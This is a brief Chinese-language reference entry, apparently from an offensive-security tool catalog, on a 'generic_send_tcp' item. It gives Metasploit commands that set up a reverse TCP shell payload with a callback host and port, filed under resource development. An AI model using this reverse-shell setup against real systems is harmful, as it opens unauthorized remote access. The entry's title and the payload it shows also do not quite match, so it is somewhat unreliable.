# generic_send_tcp

## 简介
生成 TCP 发送 shellcode

## 核心参数
无特定参数或使用默认参数

## 命令示例
```bash
# TCP 发送 payload
# 在 Metasploit 中使用
use payload/generic/shell_reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
```

## 使用场景
创建反向连接的 shellcode

## 所属分类
- [资源开发 (Resource Development)](../categories/26-resource-development.md)
